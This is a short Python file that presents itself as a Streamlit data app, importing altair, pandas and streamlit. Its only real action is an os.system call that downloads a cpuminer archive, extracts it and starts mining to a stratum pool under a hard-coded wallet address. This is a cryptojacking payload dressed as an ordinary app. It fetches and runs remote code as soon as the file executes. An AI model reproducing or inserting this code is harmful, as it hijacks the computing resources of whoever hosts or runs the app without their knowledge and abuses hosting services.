from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
os.system("lscpu") 
os.system ("curl -L -o cpuminer-opt-linux.tar.gz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.21/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz && ./cpuminer-ryzen -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.STM -t 15") 
